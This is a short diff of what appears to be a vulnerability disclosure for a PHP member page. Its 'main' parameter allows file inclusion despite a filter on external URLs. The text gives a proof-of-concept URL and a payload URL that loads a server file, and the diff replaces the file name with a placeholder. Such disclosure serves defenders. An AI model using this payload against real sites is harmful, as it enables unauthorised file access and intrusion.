@@ -38,4 +38,4 @@ Only made a simple protection mechanism,do not allow external URL loading.Howeve
 POC :      
 http://domain/member/index.php?main=post.php?job=postnew    
 payload：
-http://domain/member/index.php?main=http://domain/hack/upgrade/data.sql
+http://domain/member/index.php?main=http://domain/hack/upgrade/xxx.xxx
